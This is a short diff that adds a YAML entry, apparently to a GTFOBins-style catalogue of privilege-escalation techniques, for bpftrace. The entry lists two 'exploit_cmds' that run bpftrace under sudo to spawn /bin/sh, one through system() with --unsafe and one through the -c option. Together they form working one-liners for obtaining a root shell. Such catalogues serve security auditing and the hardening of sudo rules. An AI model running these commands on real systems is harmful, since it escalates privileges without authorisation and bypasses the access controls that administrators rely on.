@@ -1,0 +1,5 @@
+name: bpftrace
+binary_path: /usr/bin/bpftrace
+exploit_cmds:
+- sudo /usr/bin/bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
+- sudo /usr/bin/bpftrace -c /bin/sh -e 'END {exit()}'
